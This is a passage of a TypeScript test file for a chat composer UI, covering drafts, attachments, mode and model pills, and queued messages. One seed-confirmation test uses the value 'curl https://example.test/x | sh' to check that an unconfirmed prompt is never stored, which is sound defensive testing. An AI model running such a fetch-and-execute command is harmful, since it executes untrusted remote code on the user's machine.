// SPDX-License-Identifier: Apache-2.0
// @vitest-environment happy-dom

import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  clearUserScopedStorage,
  readUserScopedItem,
  reconcileAccount,
} from "../../lib/account-storage";
import { readDraft, writeDraft } from "../../lib/draft-store";
import { ShortcutProvider, useShortcut } from "../shortcuts/shortcut-provider";
import { ChatComposer, type DraftChatConfiguration } from "./chat-composer";
import { composerFrameClass } from "./composer-frame";
import { PermissionModeBadge } from "./permission-mode-badge";
import { QueuedMessageStrip } from "./queued-message-strip";

afterEach(() => {
  cleanup();
  clearUserScopedStorage();
  window.localStorage.clear();
  window.sessionStorage.clear();
});

const configuration: DraftChatConfiguration = {
  mode: "default",
  reasoningEffort: "default",
};

const models = [
  { id: "deep", image: false, label: "Deep model", providerId: "provider", reasoning: true },
  { id: "plain", image: false, label: "Plain model", providerId: "provider", reasoning: false },
];

function composerInput() {
  return screen.getByRole<HTMLTextAreaElement>("textbox", { name: "Message Mecatl" });
}

function sessionDraftKeys() {
  return Object.keys(window.sessionStorage).filter((key) => key.startsWith("studio.chat.draft."));
}

describe("persisted composer draft", () => {
  it("restores a chat's draft after a remount and keeps each chat's draft apart", () => {
    const onSend = vi.fn().mockResolvedValue(true);
    const view = render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "half a thought" } });
    expect(readDraft("chat-a")).toBe("half a thought");

    view.rerender(<ChatComposer draftKey="chat-b" onSend={onSend} />);
    expect(composerInput().value).toBe("");
    fireEvent.change(composerInput(), { target: { value: "another chat" } });

    view.rerender(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    expect(composerInput().value).toBe("half a thought");
    view.unmount();

    render(<ChatComposer draftKey="chat-b" onSend={onSend} />);
    expect(composerInput().value).toBe("another chat");
  });

  it("drops staged attachments when another chat opens", async () => {
    const user = userEvent.setup();
    const onSend = vi.fn().mockResolvedValue(true);
    const view = render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    await user.upload(
      screen.getByLabelText("Choose files to attach"),
      new File(["# Notes"], "notes.md", { type: "text/markdown" }),
    );
    expect(await screen.findByText("notes.md")).toBeTruthy();
    view.rerender(<ChatComposer draftKey="chat-b" onSend={onSend} />);
    expect(screen.queryByText("notes.md")).toBeNull();
  });

  it("clears the stored draft once a send is accepted, and keeps it when refused", async () => {
    const onSend = vi.fn().mockResolvedValueOnce(false).mockResolvedValueOnce(true);
    render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "send me" } });
    fireEvent.keyDown(composerInput(), { key: "Enter" });
    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));
    await waitFor(() => expect(composerInput().disabled).toBe(false));
    expect(readDraft("chat-a")).toBe("send me");

    fireEvent.keyDown(composerInput(), { key: "Enter" });
    await waitFor(() => expect(composerInput().value).toBe(""));
    expect(readDraft("chat-a")).toBe("");
    expect(sessionDraftKeys()).toEqual([]);
  });

  it("carries a draft's text into the chat its first send opens", async () => {
    let accept: ((accepted: boolean) => void) | undefined;
    const onSend = vi.fn(
      () =>
        new Promise<boolean>((resolve) => {
          accept = resolve;
        }),
    );
    const view = render(<ChatComposer draftKey="new" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "first prompt" } });
    fireEvent.keyDown(composerInput(), { key: "Enter" });
    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));

    // The send created chat-a and opened it before its first delivery.
    view.rerender(<ChatComposer createdChatKey="chat-a" draftKey="chat-a" onSend={onSend} />);
    expect(composerInput().value).toBe("first prompt");
    await act(async () => accept?.(false));
    expect(composerInput().value).toBe("first prompt");
    expect(readDraft("new")).toBe("");
    expect(readDraft("chat-a")).toBe("first prompt");
  });

  it("clears the stored draft from the clear button and the escape signal", async () => {
    const user = userEvent.setup();
    const onSend = vi.fn().mockResolvedValue(true);
    const view = render(<ChatComposer clearDraftSignal={0} draftKey="chat-a" onSend={onSend} />);
    expect(screen.queryByRole("button", { name: "Clear draft" })).toBeNull();
    fireEvent.change(composerInput(), { target: { value: "scratch" } });
    await user.click(screen.getByRole("button", { name: "Clear draft" }));
    expect(composerInput().value).toBe("");
    expect(document.activeElement).toBe(composerInput());
    expect(readDraft("chat-a")).toBe("");
    expect(screen.queryByRole("button", { name: "Clear draft" })).toBeNull();

    fireEvent.change(composerInput(), { target: { value: "scratch again" } });
    view.rerender(<ChatComposer clearDraftSignal={1} draftKey="chat-a" onSend={onSend} />);
    await waitFor(() => expect(composerInput().value).toBe(""));
    expect(readDraft("chat-a")).toBe("");
  });

  it("keeps a restored draft when the composer remounts after an earlier escape clear", async () => {
    writeDraft("chat-a", "came back to this");
    const onSend = vi.fn().mockResolvedValue(true);
    const view = render(<ChatComposer clearDraftSignal={3} draftKey="chat-a" onSend={onSend} />);
    expect(composerInput().value).toBe("came back to this");
    expect(readDraft("chat-a")).toBe("came back to this");
    view.rerender(<ChatComposer clearDraftSignal={4} draftKey="chat-a" onSend={onSend} />);
    await waitFor(() => expect(composerInput().value).toBe(""));
    expect(readDraft("chat-a")).toBe("");
  });

  it("never shows one account's draft to the next account", () => {
    const onSend = vi.fn().mockResolvedValue(true);
    reconcileAccount("alice");
    const alice = render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "Alice's unsent secret" } });
    expect(readUserScopedItem("studio.chat.draft.chat-a", window.sessionStorage)).toBe(
      "Alice's unsent secret",
    );

    // The auth gate remounts the workspace only after storage is reconciled,
    // so Alice's composer is still mounted when Bob's account takes over.
    expect(reconcileAccount("bob")).toBe(true);
    expect(sessionDraftKeys()).toEqual([]);
    alice.unmount();
    expect(sessionDraftKeys()).toEqual([]);

    render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    expect(composerInput().value).toBe("");
    expect(sessionDraftKeys()).toEqual([]);
  });

  it("never writes a refused send back into the next account's drafts", async () => {
    let accept: ((accepted: boolean) => void) | undefined;
    const onSend = vi.fn(
      () =>
        new Promise<boolean>((resolve) => {
          accept = resolve;
        }),
    );
    reconcileAccount("alice");
    const alice = render(<ChatComposer draftKey="new" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "Alice's secret" } });
    fireEvent.keyDown(composerInput(), { key: "Enter" });
    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));
    // Alice opens another chat mid-send, then Bob's account takes over.
    alice.rerender(<ChatComposer draftKey="chat-y" onSend={onSend} />);
    expect(reconcileAccount("bob")).toBe(true);
    alice.unmount();

    await act(async () => accept?.(false));
    expect(sessionDraftKeys()).toEqual([]);
    render(<ChatComposer draftKey="new" onSend={onSend} />);
    expect(composerInput().value).toBe("");
  });

  it("keeps a draft the user cleared when its refused send settles elsewhere", async () => {
    let accept: ((accepted: boolean) => void) | undefined;
    const onSend = vi.fn(
      () =>
        new Promise<boolean>((resolve) => {
          accept = resolve;
        }),
    );
    const view = render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "for chat-a" } });
    fireEvent.keyDown(composerInput(), { key: "Enter" });
    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));
    // Away and back mid-send; the user clears chat-a's copy, then leaves again.
    view.rerender(<ChatComposer draftKey="chat-b" onSend={onSend} />);
    view.rerender(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "" } });
    view.rerender(<ChatComposer draftKey="chat-b" onSend={onSend} />);

    await act(async () => accept?.(false));
    expect(readDraft("chat-a")).toBe("");
  });

  it("keeps the draft in memory only without a draft key", () => {
    writeDraft("new", "stored");
    render(<ChatComposer onSend={vi.fn().mockResolvedValue(true)} />);
    expect(composerInput().value).toBe("");
    fireEvent.change(composerInput(), { target: { value: "typed" } });
    expect(readDraft("new")).toBe("stored");
  });

  it("swaps in the next chat's own draft when another chat opens during a send", async () => {
    writeDraft("chat-b", "chat-b's own draft");
    let accept: ((accepted: boolean) => void) | undefined;
    const onSend = vi.fn(
      (_prompt: string) =>
        new Promise<boolean>((resolve) => {
          accept = resolve;
        }),
    );
    const view = render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "for chat-a" } });
    fireEvent.keyDown(composerInput(), { key: "Enter" });
    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));

    view.rerender(<ChatComposer draftKey="chat-b" onSend={onSend} />);
    expect(composerInput().value).toBe("chat-b's own draft");
    expect(readDraft("chat-b")).toBe("chat-b's own draft");

    // A refused send leaves its text in the chat it was typed in.
    await act(async () => accept?.(false));
    expect(composerInput().value).toBe("chat-b's own draft");
    expect(readDraft("chat-a")).toBe("for chat-a");
    expect(readDraft("chat-b")).toBe("chat-b's own draft");

    // Enter in chat-b sends chat-b's draft, never chat-a's message.
    fireEvent.keyDown(composerInput(), { key: "Enter" });
    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(2));
    expect(onSend.mock.calls[1]?.[0]).toBe("chat-b's own draft");

    view.rerender(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    expect(composerInput().value).toBe("for chat-a");
  });

  it("clears only the sent chat's draft when a send is accepted after a switch", async () => {
    writeDraft("chat-b", "chat-b's own draft");
    let accept: ((accepted: boolean) => void) | undefined;
    const onSend = vi.fn(
      () =>
        new Promise<boolean>((resolve) => {
          accept = resolve;
        }),
    );
    const view = render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "for chat-a" } });
    fireEvent.keyDown(composerInput(), { key: "Enter" });
    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));

    view.rerender(<ChatComposer draftKey="chat-b" onSend={onSend} />);
    await act(async () => accept?.(true));
    expect(composerInput().value).toBe("chat-b's own draft");
    expect(readDraft("chat-b")).toBe("chat-b's own draft");
    expect(readDraft("chat-a")).toBe("");

    view.rerender(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    expect(composerInput().value).toBe("");
  });

  it("carries a draft's text only into the chat its send created", async () => {
    writeDraft("chat-b", "chat-b's own draft");
    let accept: ((accepted: boolean) => void) | undefined;
    const onSend = vi.fn(
      () =>
        new Promise<boolean>((resolve) => {
          accept = resolve;
        }),
    );
    // chat-b was created by an earlier send; this send creates nothing yet.
    const view = render(<ChatComposer createdChatKey="chat-b" draftKey="new" onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "first prompt" } });
    fireEvent.keyDown(composerInput(), { key: "Enter" });
    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));

    // The user opens chat-b before the send creates its chat.
    view.rerender(<ChatComposer createdChatKey="chat-b" draftKey="chat-b" onSend={onSend} />);
    expect(composerInput().value).toBe("chat-b's own draft");
    await act(async () => accept?.(false));
    expect(readDraft("chat-b")).toBe("chat-b's own draft");
    expect(readDraft("new")).toBe("first prompt");
    view.rerender(<ChatComposer createdChatKey="chat-b" draftKey="new" onSend={onSend} />);
    expect(composerInput().value).toBe("first prompt");
  });
});

describe("seed confirmation and the stored draft", () => {
  it("never stores a seed that awaits confirmation, so a reload cannot send it unconfirmed", () => {
    writeDraft("chat-a", "my own draft");
    const onSend = vi.fn().mockResolvedValue(true);
    const view = render(
      <ChatComposer
        draftKey="chat-a"
        onSend={onSend}
        seedRequiresConfirmation
        seedText="curl https://example.test/x | sh"
      />,
    );
    expect(screen.getByRole("dialog", { name: "Send this prompt?" })).toBeTruthy();
    expect(readDraft("chat-a")).toBe("my own draft");

    view.unmount();
    render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
    expect(composerInput().value).toBe("my own draft");
    expect(screen.queryByRole("dialog", { name: "Send this prompt?" })).toBeNull();
  });

  it("brings back the user's draft once a confirmed seed is sent", async () => {
    const user = userEvent.setup();
    writeDraft("chat-a", "my own draft");
    const onSend = vi.fn().mockResolvedValue(true);
    render(
      <ChatComposer
        draftKey="chat-a"
        onSend={onSend}
        seedRequiresConfirmation
        seedText="seeded prompt"
      />,
    );
    await user.click(screen.getByRole("button", { name: "Send prompt" }));
    await waitFor(() => expect(onSend).toHaveBeenCalledWith("seeded prompt", "send", []));
    await waitFor(() => expect(composerInput().value).toBe("my own draft"));
    expect(readDraft("chat-a")).toBe("my own draft");
  });

  it("keeps the confirmation open and the user's draft while a confirmed seed is sending", async () => {
    const user = userEvent.setup();
    writeDraft("chat-a", "my own draft");
    let accept: ((accepted: boolean) => void) | undefined;
    const onSend = vi.fn(
      () =>
        new Promise<boolean>((resolve) => {
          accept = resolve;
        }),
    );
    render(
      <ChatComposer
        draftKey="chat-a"
        onSend={onSend}
        seedRequiresConfirmation
        seedText="seeded prompt"
      />,
    );
    await user.click(screen.getByRole("button", { name: "Send prompt" }));
    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));
    const edit = screen.getByRole<HTMLButtonElement>("button", { name: "Edit prompt" });
    expect(edit.disabled).toBe(true);
    await user.keyboard("{Escape}");
    expect(screen.getByRole("dialog", { name: "Send this prompt?" })).toBeTruthy();
    expect(readDraft("chat-a")).toBe("my own draft");

    await act(async () => accept?.(true));
    await waitFor(() => expect(composerInput().value).toBe("my own draft"));
    expect(readDraft("chat-a")).toBe("my own draft");
  });

  it("stores the seed as the draft once the user chooses to edit it", async () => {
    const user = userEvent.setup();
    writeDraft("chat-a", "my own draft");
    render(
      <ChatComposer
        draftKey="chat-a"
        onSend={vi.fn().mockResolvedValue(true)}
        seedRequiresConfirmation
        seedText="seeded prompt"
      />,
    );
    await user.click(screen.getByRole("button", { name: "Edit prompt" }));
    await waitFor(() =>
      expect(screen.queryByRole("dialog", { name: "Send this prompt?" })).toBeNull(),
    );
    expect(composerInput().value).toBe("seeded prompt");
    expect(readDraft("chat-a")).toBe("seeded prompt");
  });
});

describe("text file attachments", () => {
  it("inlines an attached text file into the sent prompt", async () => {
    const user = userEvent.setup();
    const onSend = vi.fn().mockResolvedValue(true);
    const onPreviewFile = vi.fn();
    render(<ChatComposer onPreviewFile={onPreviewFile} onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "Review this" } });
    await user.upload(
      screen.getByLabelText("Choose files to attach"),
      new File(["# Notes\nship it"], "notes.md", { type: "text/markdown" }),
    );
    const attachments = await screen.findByRole("list", { name: "Attachments" });
    await user.click(within(attachments).getByRole("button", { name: "Preview notes.md" }));
    expect(onPreviewFile).toHaveBeenCalledWith({
      content: "# Notes\nship it",
      kind: "markdown",
      name: "notes.md",
      size: 15,
      type: "text/markdown",
    });

    await user.click(screen.getByRole("button", { name: "Send message" }));
    await waitFor(() =>
      expect(onSend).toHaveBeenCalledWith(
        "Review this\n\n--- attached file: notes.md ---\n# Notes\nship it\n--- end of notes.md ---",
        "send",
        [],
      ),
    );
    await waitFor(() => expect(screen.queryByText("notes.md")).toBeNull());
  });

  it("sends a file on its own and enables Send for it", async () => {
    const user = userEvent.setup();
    const onSend = vi.fn().mockResolvedValue(true);
    render(<ChatComposer onSend={onSend} />);
    const send = screen.getByRole<HTMLButtonElement>("button", { name: "Send message" });
    expect(send.disabled).toBe(true);
    await user.upload(
      screen.getByLabelText("Choose files to attach"),
      new File(["a,b\n1,2"], "data.csv", { type: "text/csv" }),
    );
    await screen.findByText("data.csv");
    expect(send.disabled).toBe(false);
    await user.click(send);
    await waitFor(() =>
      expect(onSend).toHaveBeenCalledWith(
        "--- attached file: data.csv ---\na,b\n1,2\n--- end of data.csv ---",
        "send",
        [],
      ),
    );
  });

  it("refuses binary and audio files and keeps the typed text", async () => {
    const user = userEvent.setup();
    render(<ChatComposer onSend={vi.fn().mockResolvedValue(true)} />);
    fireEvent.change(composerInput(), { target: { value: "Typed text" } });
    await user.upload(screen.getByLabelText("Choose files to attach"), [
      new File([new Uint8Array([0, 1, 2, 3])], "blob.dat"),
      new File(["sound"], "memo.m4a", { type: "audio/mp4" }),
    ]);
    await waitFor(() =>
      expect(screen.getByRole("alert").textContent).toBe(
        "memo.m4a: audio attachments are not supported yet. blob.dat: binary files can't be attached — only images and text.",
      ),
    );
    expect(screen.queryByRole("list", { name: "Attachments" })).toBeNull();
    expect(composerInput().value).toBe("Typed text");
  });

  it("holds text files until the active run ends", async () => {
    const user = userEvent.setup();
    const onSend = vi.fn().mockResolvedValue(true);
    const view = render(<ChatComposer onSend={onSend} />);
    fireEvent.change(composerInput(), { target: { value: "with notes" } });
    await user.upload(
      screen.getByLabelText("Choose files to attach"),
      new File(["notes"], "notes.txt", { type: "text/plain" }),
    );
    await screen.findByText("notes.txt");
    view.rerender(<ChatComposer onSend={onSend} working />);
    expect(
      (screen.getByRole("button", { name: "Attach files" }) as HTMLButtonElement).disabled,
    ).toBe(true);
    await user.click(screen.getByRole("button", { name: "Queue message" }));
    expect(onSend).not.toHaveBeenCalled();
    expect(screen.getByRole("alert").textContent).toBe(
      "Wait for the active run to finish before sending attachments.",
    );
    expect(composerInput().value).toBe("with notes");
  });

  it("refuses a file that would pass the text total before reading it", async () => {
    const user = userEvent.setup();
    render(<ChatComposer onSend={vi.fn().mockResolvedValue(true)} />);
    const chunk = "x".repeat(200 * 1024);
    const files = ["a.txt", "b.txt", "c.txt"].map(
      (name) => new File([chunk], name, { type: "text/plain" }),
    );
    const reads = files.map((file) => vi.spyOn(file, "text"));
    await user.upload(screen.getByLabelText("Choose files to attach"), files);
    await waitFor(() =>
      expect(screen.getByRole("alert").textContent).toBe(
        "c.txt: adding this would exceed the 512 KiB total for attached text.",
      ),
    );
    const attachments = screen.getByRole("list", { name: "Attachments" });
    expect(within(attachments).getByText("a.txt")).toBeTruthy();
    expect(within(attachments).getByText("b.txt")).toBeTruthy();
    expect(within(attachments).queryByText("c.txt")).toBeNull();
    expect(reads[0]).toHaveBeenCalledTimes(1);
    expect(reads[1]).toHaveBeenCalledTimes(1);
    expect(reads[2]).not.toHaveBeenCalled();
  });

  it("attaches files dropped on the composer", async () => {
    render(<ChatComposer onSend={vi.fn().mockResolvedValue(true)} />);
    const box = composerInput().closest("form")?.firstElementChild?.firstElementChild;
    if (!(box instanceof HTMLElement)) throw new Error("composer frame not found");
    const file = new File(["dropped"], "dropped.txt", { type: "text/plain" });
    const dataTransfer = { files: [file], types: ["Files"] };
    fireEvent.dragOver(box, { dataTransfer });
    expect(screen.getByText("Drop files to attach")).toBeTruthy();
    fireEvent.drop(box, { dataTransfer });
    expect(await screen.findByText("dropped.txt")).toBeTruthy();
    expect(screen.queryByText("Drop files to attach")).toBeNull();
  });
});

describe("composer pills", () => {
  it("changes a live chat's mode in place and forks for its model, with no default to reset to", async () => {
    const user = userEvent.setup();
    const onLiveModeChange = vi.fn();
    const onForkModel = vi.fn();
    render(
      <ChatComposer
        canForkModel
        liveMode="default"
        liveModel={{ id: "deep", providerId: "provider", reasoningEffort: "high" }}
        models={models}
        onForkModel={onForkModel}
        onLiveModeChange={onLiveModeChange}
        onSend={vi.fn().mockResolvedValue(true)}
      />,
    );
    const pills = screen.getByRole("region", { name: "Chat configuration and usage" });
    expect(within(pills).queryByLabelText("Execution")).toBeNull();
    await user.click(within(pills).getByRole("button", { name: "Mode Manual" }));
    await user.click(screen.getByRole("menuitem", { name: /^Accept edits/ }));
    expect(onLiveModeChange).toHaveBeenCalledWith("acceptEdits");

    await user.click(within(pills).getByRole("button", { name: "Model Deep model · High" }));
    expect(screen.queryByRole("menuitem", { name: "Reset to default" })).toBeNull();
    await user.hover(screen.getByRole("menuitem", { name: /^Model Deep model/ }));
    expect(screen.queryByRole("menuitem", { name: "Default" })).toBeNull();
    const plain = await screen.findByRole("menuitem", { name: "Plain model" });
    act(() => plain.focus());
    await user.keyboard("{Enter}");
    expect(onForkModel).toHaveBeenCalledWith({ id: "plain", providerId: "provider" }, "high");
  });

  it("blocks a live chat's pills while its controls are busy or model selection is off", () => {
    const props = {
      liveMode: "plan" as const,
      liveModel: { id: "deep", providerId: "provider", reasoningEffort: "default" },
      models,
      onForkModel: vi.fn(),
      onLiveModeChange: vi.fn(),
      onSend: vi.fn().mockResolvedValue(true),
    };
    const view = render(<ChatComposer {...props} canForkModel liveControlsDisabled />);
    expect((screen.getByRole("button", { name: "Mode Plan" }) as HTMLButtonElement).disabled).toBe(
      true,
    );
    expect(
      (screen.getByRole("button", { name: /^Model Deep model/ }) as HTMLButtonElement).disabled,
    ).toBe(true);
    view.rerender(<ChatComposer {...props} canForkModel={false} />);
    expect((screen.getByRole("button", { name: "Mode Plan" }) as HTMLButtonElement).disabled).toBe(
      false,
    );
    expect(
      (screen.getByRole("button", { name: /^Model Deep model/ }) as HTMLButtonElement).disabled,
    ).toBe(true);
  });

  it("hides the Model pill without an inventory and the pill row without settings", () => {
    const view = render(
      <ChatComposer
        configuration={configuration}
        onConfigurationChange={vi.fn()}
        onSend={vi.fn().mockResolvedValue(true)}
      />,
    );
    expect(screen.getByRole("button", { name: "Mode Manual" })).toBeTruthy();
    expect(screen.getByLabelText("Execution")).toBeTruthy();
    expect(screen.queryByRole("button", { name: /^Model/ })).toBeNull();
    view.rerender(<ChatComposer onSend={vi.fn().mockResolvedValue(true)} />);
    expect(screen.queryByRole("region", { name: "Chat configuration and usage" })).toBeNull();
  });

  it("notes a model that reports no reasoning support under Effort", async () => {
    const user = userEvent.setup();
    const view = render(
      <ChatComposer
        configuration={{ ...configuration, model: { id: "plain", providerId: "provider" } }}
        models={models}
        onConfigurationChange={vi.fn()}
        onSend={vi.fn().mockResolvedValue(true)}
      />,
    );
    await user.click(screen.getByRole("button", { name: /^Model Plain model/ }));
    await user.hover(screen.getByRole("menuitem", { name: /^Effort/ }));
    expect(
      await screen.findByText("This model reports no reasoning support — a tier may be ignored."),
    ).toBeTruthy();
    await user.keyboard("{Escape}");
    view.rerender(
      <ChatComposer
        configuration={{ ...configuration, model: { id: "deep", providerId: "provider" } }}
        models={models}
        onConfigurationChange={vi.fn()}
        onSend={vi.fn().mockResolvedValue(true)}
      />,
    );
    await user.click(screen.getByRole("button", { name: /^Model Deep model/ }));
    await user.hover(screen.getByRole("menuitem", { name: /^Effort/ }));
    await screen.findByRole("menuitem", { name: "High" });
    expect(screen.queryByText(/reports no reasoning support/)).toBeNull();
  });

  it("blocks app shortcuts while the phone sheet is open", async () => {
    const user = userEvent.setup();
    const openShortcuts = vi.fn();
    function ShortcutProbe() {
      useShortcut("shortcuts.open", openShortcuts);
      return null;
    }
    render(
      <ShortcutProvider>
        <ShortcutProbe />
        <ChatComposer
          configuration={configuration}
          models={models}
          onConfigurationChange={vi.fn()}
          onSend={vi.fn().mockResolvedValue(true)}
        />
      </ShortcutProvider>,
    );
    await user.keyboard("?");
    expect(openShortcuts).toHaveBeenCalledTimes(1);

    await user.click(screen.getByRole("button", { name: "Composer options" }));
    expect(screen.getByRole("dialog", { name: "Composer options" })).toBeTruthy();
    await user.keyboard("?");
    expect(openShortcuts).toHaveBeenCalledTimes(1);
  });

  it("offers a draft's Default model and Reset in the phone sheet", async () => {
    const user = userEvent.setup();
    const onConfigurationChange = vi.fn();
    render(
      <ChatComposer
        configuration={{
          ...configuration,
          model: { id: "deep", providerId: "provider" },
          reasoningEffort: "max",
        }}
        models={models}
        onConfigurationChange={onConfigurationChange}
        onSend={vi.fn().mockResolvedValue(true)}
      />,
    );
    await user.click(screen.getByRole("button", { name: "Composer options" }));
    const sheet = screen.getByRole("dialog", { name: "Composer options" });
    expect(within(sheet).getByRole("button", { name: /^Model Deep model · Max/ })).toBeTruthy();
    await user.click(within(sheet).getByRole("button", { name: /^Model/ }));
    expect(
      within(sheet).getByRole("button", { name: "Deep model" }).getAttribute("aria-pressed"),
    ).toBe("true");
    expect(within(sheet).getByRole("button", { name: "Default" })).toBeTruthy();
    await user.type(within(sheet).getByRole("textbox", { name: "Search models" }), "zzz");
    expect(within(sheet).getByText("No models match")).toBeTruthy();
    await user.click(within(sheet).getByRole("button", { name: "Reset to default" }));
    expect(onConfigurationChange).toHaveBeenCalledWith({
      ...configuration,
      model: undefined,
      reasoningEffort: "default",
    });
  });

  it("blocks the phone sheet's open Mode view and Execution picker once their controls are disabled", async () => {
    const user = userEvent.setup();
    const onConfigurationChange = vi.fn();
    const props = {
      configuration,
      models,
      onConfigurationChange,
      onSend: vi.fn().mockResolvedValue(true),
    };
    const view = render(<ChatComposer {...props} />);
    await user.click(screen.getByRole("button", { name: "Composer options" }));
    let sheet = screen.getByRole("dialog", { name: "Composer options" });
    await user.click(within(sheet).getByRole("button", { name: /^Mode\s/ }));
    // A run starts while the Mode view is open.
    view.rerender(<ChatComposer {...props} working />);
    const plan = within(sheet).getByRole<HTMLButtonElement>("button", { name: /^Plan/ });
    expect(plan.disabled).toBe(true);
    fireEvent.click(plan);
    await user.click(within(sheet).getByRole("button", { name: "Back from Mode" }));

    view.rerender(<ChatComposer {...props} />);
    // The Execution picker sits inline in the sheet's main view.
    view.rerender(<ChatComposer {...props} working />);
    sheet = screen.getByRole("dialog", { name: "Composer options" });
    const execution = within(sheet).getByLabelText<HTMLSelectElement>("Execution");
    expect(execution.disabled).toBe(true);
    await user.selectOptions(execution, "none");
    expect(onConfigurationChange).not.toHaveBeenCalled();
  });

  it("blocks a live chat's open Mode view once its controls are busy", async () => {
    const user = userEvent.setup();
    const onLiveModeChange = vi.fn();
    const props = {
      liveMode: "default" as const,
      onLiveModeChange,
      onSend: vi.fn().mockResolvedValue(true),
    };
    const view = render(<ChatComposer {...props} />);
    await user.click(screen.getByRole("button", { name: "Composer options" }));
    const sheet = screen.getByRole("dialog", { name: "Composer options" });
    await user.click(within(sheet).getByRole("button", { name: /^Mode\s/ }));
    view.rerender(<ChatComposer {...props} liveControlsDisabled />);
    const plan = within(sheet).getByRole<HTMLButtonElement>("button", { name: /^Plan/ });
    expect(plan.disabled).toBe(true);
    fireEvent.click(plan);
    expect(onLiveModeChange).not.toHaveBeenCalled();
  });

  it("tints a draft's frame by its mode", () => {
    const view = render(
      <ChatComposer
        configuration={{ ...configuration, mode: "plan" }}
        onConfigurationChange={vi.fn()}
        onSend={vi.fn().mockResolvedValue(true)}
      />,
    );
    const frame = () => composerInput().closest("form")?.firstElementChild?.firstElementChild;
    expect(frame()?.className).toContain("border-info/50");
    view.rerender(<ChatComposer onSend={vi.fn().mockResolvedValue(true)} />);
    expect(frame()?.className).toContain("border-zinc-300");
  });
});

describe("composerFrameClass", () => {
  const plain = { hasText: false, isDragOver: false, isStreaming: false };

  it("uses the plain border with no mode and for Manual", () => {
    expect(composerFrameClass(plain)).toBe("border-zinc-300 dark:border-zinc-700");
    expect(composerFrameClass({ ...plain, mode: "default" })).toBe(
      "border-zinc-300 dark:border-zinc-700",
    );
  });

  it("tints Plan and Accept edits", () => {
    expect(composerFrameClass({ ...plain, mode: "plan" })).toBe(
      "border-info/50 ring-1 ring-info/20",
    );
    expect(composerFrameClass({ ...plain, mode: "acceptEdits" })).toBe(
      "border-success/50 ring-1 ring-success/20",
    );
  });

  it("puts typed text during a run over the mode, and a drag over everything", () => {
    expect(composerFrameClass({ ...plain, hasText: true, isStreaming: true, mode: "plan" })).toBe(
      "border-warning shadow-warning/10",
    );
    expect(composerFrameClass({ ...plain, isStreaming: true, mode: "plan" })).toBe(
      "border-info/50 ring-1 ring-info/20",
    );
    expect(
      composerFrameClass({ hasText: true, isDragOver: true, isStreaming: true, mode: "plan" }),
    ).toBe("border-brand bg-brand/5 dark:bg-brand/10 ring-2 ring-brand/20");
  });
});

describe("PermissionModeBadge", () => {
  it("stays silent for Manual and names the other modes", () => {
    const view = render(<PermissionModeBadge mode="default" />);
    expect(view.container.textContent).toBe("");
    view.rerender(<PermissionModeBadge mode="acceptEdits" />);
    expect(screen.getByText("Accept edits").closest("[title]")?.getAttribute("title")).toBe(
      "Permission mode: Accept edits",
    );
    view.rerender(<PermissionModeBadge mode="plan" />);
    expect(view.container.textContent).toBe("Permission mode: Plan");
  });
});

describe("QueuedMessageStrip", () => {
  const items = [
    { createdAt: 1, id: "q1", text: "first follow-up" },
    { createdAt: 2, id: "q2", text: "second follow-up" },
  ];

  it("renders nothing for an empty queue", () => {
    const view = render(<QueuedMessageStrip items={[]} onDelete={vi.fn()} onEdit={vi.fn()} />);
    expect(view.container.innerHTML).toBe("");
  });

  it("offers Steer only while a run can take it", async () => {
    const user = userEvent.setup();
    const onSteer = vi.fn();
    const view = render(<QueuedMessageStrip items={items} onDelete={vi.fn()} onEdit={vi.fn()} />);
    const strip = screen.getByRole("region", { name: "Queued messages" });
    expect(within(strip).getByText("2 queued messages")).toBeTruthy();
    await user.click(screen.getByRole("button", { name: "Actions for queued message 1" }));
    expect(screen.queryByRole("menuitem", { name: "Steer" })).toBeNull();
    await user.keyboard("{Escape}");

    view.rerender(
      <QueuedMessageStrip items={items} onDelete={vi.fn()} onEdit={vi.fn()} onSteer={onSteer} />,
    );
    await user.click(screen.getByRole("button", { name: "Actions for queued message 2" }));
    await user.click(await screen.findByRole("menuitem", { name: "Steer" }));
    expect(onSteer).toHaveBeenCalledWith("q2");

    view.rerender(
      <QueuedMessageStrip
        items={items}
        onDelete={vi.fn()}
        onEdit={vi.fn()}
        onSteer={onSteer}
        steeringId="q2"
      />,
    );
    expect(
      (screen.getByRole("button", { name: "Actions for queued message 2" }) as HTMLButtonElement)
        .disabled,
    ).toBe(true);
  });

  it("edits a message in place and deletes another", async () => {
    const user = userEvent.setup();
    const onEdit = vi.fn();
    const onDelete = vi.fn();
    render(<QueuedMessageStrip items={items} onDelete={onDelete} onEdit={onEdit} />);
    await user.click(screen.getByRole("button", { name: "Actions for queued message 1" }));
    await user.click(await screen.findByRole("menuitem", { name: "Edit" }));
